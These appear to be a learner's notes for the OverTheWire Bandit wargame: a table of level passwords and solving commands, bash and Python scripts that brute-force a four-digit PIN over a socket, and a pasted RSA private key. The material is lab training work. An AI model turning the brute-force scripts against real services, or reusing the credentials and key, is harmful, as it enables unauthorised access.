  For	 Password				ultimate commands
bandit0  bandit0									
bandit1  ZjLjTmM6FvvyRnrb2rfNWOZOTa6ip5If cat readme				
bandit2  263JGJPfgU6LtdEvgfWU1XP5yac29mFx cat ./-
bandit3  MNk8KNH3Usiio41PRUEoDFPqfxLPlSmx cat "spaces in this filename"
bandit4  2WmrDFRmJIq3IPxneAaMGhap0pFhF3NJ cat ...Hiding-From-You
bandit5  4oQYVPkxZOOEOO5pTW81FB8j8lxXGUQw cat -- -file07
bantit6  HWasnPhtq9AVKe0dmk45nxy20cvUa6EG cat ./maybehere07/.file2
bandit7  morbNTDkSW6jIlUc0ymOdMaLnOlFVAaj cat bandit7.password
bandit8  dfwvzFQi4mU0wfNbFOe9RoWskMLg7eEc grep 'millionth' data.txt
bandit9  4CKMh1JI91bUIZZPXDqGanal4xvAg0JM sort data.txt | uniq -u
bandit10 FGUW5ilLVJrxX9kMYMmlN4MgbpfMiqey sort '=' data.txt
bantid11 dtR173fZKb0RRsDFSGsg2RWnpNVj3qRr base64 -d data.txt
bantid12 7x16WNeHIi5YkIhWsfFIqoognUTyj9Q4 cat data.txt | 'N-ZA-Mn-za-m'
bantid13 FO5dwFsc0cbaIiH0h8J2eUks2vdTDwAn cat data8
bantid14 MU4VWeTyJk8ROof1qqmcBPaLh7lDCPvS cat /etc/bandit_pass/bandit14
bantid15 8xCjnmgoKbGLhHFAZlGE5Tmu4M2tKJQo echo "MU4VWeTyJk8ROof1qqmcBPaLh7lDCPvS" | nc localhost 30000
bantid16 kSkvUpMQ7lBYyCM4GBPvCvT1BfWRy0Dx openssl s_client -connect localhost:30001
bantid17 EReVavePLFHtFlFsjn3hyzMlvSuSAcRD nmap -p 31000-32000 localhost    echo "kSkvUpMQ7lBYyCM4GBPvCvT1BfWRy0Dx" | ncat --ssl localhost 31790
bantid18 x2gLTTjFwMOhQ8oWNbMN362QKxfRqGlO diff passwords.new passwords.old
bantid19 cGWpMaKXVwDUNgPAVJbWYuGHVn9zl3j8 ssh -p 2220 bandit18@bandit.labs.overthewire.org "cat ~/readme"
bantid20 0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO ./bandit20-do cat /etc/bandit_pass/bandit20 
bantid21 EeoULMCra2q0dSkYj561DX7s1CpBuOBt echo "0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO" | nc -l -p 1234              ./suconnect 1234
bantid22 tRae0UfB9v0UzbCdn9cY0gQnds9GF58Q cat /usr/bin/cronjob_bandit22.sh
bantid23 0Zf11ioIjMVN551jX3CmStKLYqjk54Ga echo I am user bandit23 | md5sum | cut -d ' ' -f 1
bantid24 gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 chmod 777 test.sh
bantid25 iCi86ttT4KSNe1armKiwbQNmB3YJP3q4 #!/bin/bash bandit24=gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 for pin in {0000..9999}; do echo "$bandit24 $pin" done | nc localhost 30002
bantid26 s0773xxkk0MXfdqOfPRVr9L3jJBUOgCZ :e /etc/bandit_pass/bandit26
bantid27 upsNCc7vzaRDx6oZC6GiR6ERwe1MowGB :set shell=/bin/bash            ./bandit27-do cat /etc/bandit_pass/bandit27
bantid28 Yz9IpL0sBcCeuG7m9uQFt8ZNpS4HZRcN git clone ssh://bandit27-git@localhost:2220/home/bandit27-git/repo
bantid29 4pT1t5DENaYuqnqvadYs1oE4QLCdjmJ7 git clone ssh://bandit28-git@localhost:2220/home/bandit28-git/repo        git log -p
bantid30 qp30ex3VLz5MDG1n91YowTv4Q8l7CDZL git branch -a   git checkout dev
bantid31 fb5S2xb7bRyFmAvQYQGEqsbhVyJqhnDy git tag         git show secret
bantid32 3O9RfhqyAlVBEZpVb6LYStshZoqoSx5K echo "May I come in?" > key.txt       git add key.txt git commit -m "Added key file"   git push origin master
bantid33 tQdtbs5D5i2vJwkO8mEyYEyTL8izoeJ0 $0
bantid34     en proceso



#!/bin/bash
bandit24=gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
for pin in {0000..9999}; do
    echo "$bandit24 $pin"
	echo pin
done | nc localhost 30002



import socket

# Dirección del servidor y puerto
host = "bandit.labs.overthewire.org"
port = 30002

# Contraseña de Bandit24
password = "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8"

# Función para realizar la fuerza bruta
def brute_force():
    for pin in range(10000):
        pin_str = f"{pin:04d}"  # Asegura que el PIN tenga 4 dígitos, por ejemplo "0001"
        message = f"{password} {pin_str}\n"

        # Crear una conexión con el servidor
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))

        # Enviar la contraseña y el PIN
        s.send(message.encode())

        # Leer la respuesta
        response = s.recv(1024).decode()

        # Si encontramos la respuesta correcta, imprimimos y salimos
        if "Success" in response:
            print(f"El PIN correcto es: {pin_str}")
            break

        # Cerrar la conexión
        s.close()

if __name__ == "__main__":
    brute_force()


#!/usr/bin/env python3

import socket

# Contraseña para bandit24
PASSWORD = "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8"

# Función para probar un PIN
def try_pin(pin):
    # Conectar al servidor en localhost, puerto 30002
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect(("localhost", 30002))
        
        # Enviar la contraseña y el PIN
        s.sendall(f"{PASSWORD} {pin}\n".encode())
        
        # Recibir la respuesta
        response = s.recv(1024).decode()
        
        # Verificar si la respuesta contiene la contraseña de bandit25
        if "The password of bandit25 is" in response:
            print(response)
            return True
    return False

# Bucle para probar todos los PINs de 4 dígitos
for pin in range(10000):
    pin_str = f"{pin:04}"  # Formatear el PIN como 4 dígitos (0000 a 9999)
    print(f"Probando PIN: {pin_str}")
    if try_pin(pin_str):
        break
 
echo "MU4VWeTyJk8ROof1qqmcBPaLh7lDCPvS" | nc localhost 30000
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGSQ4TzdbZw5PshaEVz1o9ppCZAN2DO5cK/6mlkdr75u5KQ36CDS1yvsXDw0sZrn5TN5zasSDRaZ568HXcAihinQxnIROrjq36OT2m43BnAi31eAFm58a1kTBZsVbD+9Us3A5cF7hRZK0ZFbOA+kR5K/lNvVWMtkgF0amFMgrbYCbPpltOEyyIyfIlp8TAn9Pw9A7ebJL3W9QcS6g4wDOhQgPiQ3QwRnf5dqHIrQclWrrwqxU5t59cbW+8DcYAnb2TElqq9F+BiepmvJY3vDcIeM1Thz/YmSn6fwvRKfFo0D5ZgDuOI/JMXSKzy7MyVhDiXUvOH/z8ym+EJAXyvbZ3 rudy@localhost



echo "-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJimZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQJa6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTuDSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbWJGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNXx0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvDKHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBlJ9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovdd8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nCYNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8AvLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama+TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnxSatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHdHCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+ExdvtSghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0AR57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDiTtiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg
R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiuL8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Niblh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkUYOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0bdxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=
-----END RSA PRIVATE KEY-----" > bandit17.key
